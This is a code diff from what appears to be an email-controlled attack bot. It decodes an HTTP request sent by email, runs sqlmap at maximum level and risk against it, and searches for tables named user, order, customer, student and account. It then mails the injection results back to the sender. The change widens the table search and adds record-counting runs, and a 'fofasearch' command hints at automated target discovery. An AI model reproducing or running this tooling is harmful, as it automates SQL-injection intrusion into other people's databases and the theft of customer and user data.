@@ -57,15 +57,17 @@ def doCommand(sender, body: str):
                 b64FileContent, TmpFileName), subject="自动处理 sql注入")
             shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
             ret = shell(
-                "sqlmap -r %s --batch --level=5 --risk=3 --threads=10 --dbs --ignore-code=404 --search -T user,order,customer,kehu --stop=10&&sqlmap -r %s --batch "
-                "--level=5 --risk=3 --search -T user,order,customer,kehu --stop=10"
-                "--threads=10 --dbs --force-ssl --ignore-code=404" % (TmpFileName, TmpFileName))
+                "sqlmap -r %s --batch --level=5 --risk=3 --threads=10 --count --ignore-code=404&&sqlmap -r %s --batch "
+                "--level=5 --risk=3 --threads=10 --count --ignore-code=404 --force-ssl&&sqlmap -r %s --batch "
+                "--level=5 --risk=3 --threads=10 --dbs --ignore-code=404 --search -T user,order,customer,kehu,"
+                "student,account --stop=10&&sqlmap -r %s --batch "
+                "--level=5 --risk=3 --search -T user,order,customer,kehu,student,account --stop=10"
+                "--threads=10 --dbs --force-ssl --ignore-code=404 " % (TmpFileName, TmpFileName,TmpFileName,TmpFileName))
             status = '失败'
             if "Payload:" in ret:
                 status = '成功'
             send_email(sender, "*SQL注入结果\n%s" % ret, subject="SQL INJ 结果%s" % status)
         if 'fofasearch\n' in body:
-
             body = body.replace("fofasearch\n", "")
             if not CDLA:
                 CDLA = True
